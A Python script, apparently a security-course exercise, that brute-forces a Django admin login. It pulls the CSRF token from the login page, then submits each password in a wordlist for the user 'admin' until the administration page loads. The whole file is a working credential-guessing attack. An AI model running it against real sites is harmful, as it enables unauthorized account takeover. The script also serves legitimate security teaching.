import sys
import requests
import bs4 as bs

# TODO: Muokkaa bruteforcee bobin salasana

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	url = address + "/admin/login/?next=/admin/"
	#print("URL: " + url)
	s = requests.Session()

	#print("Extracting CSRF token..")
	res = s.get(url)
	csrftoken = extract_token(res)
	#print("CSRF token: " + csrftoken)

	#print("Trying passwords..")
	for pw in candidates:
		res = s.post(
			url,
			data={
				"csrfmiddlewaretoken": csrftoken,
				"username": "admin",
				"password": pw,
				"next": "/admin/"
			}
		)
		if isloggedin(res):
			return pw

	return None



def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
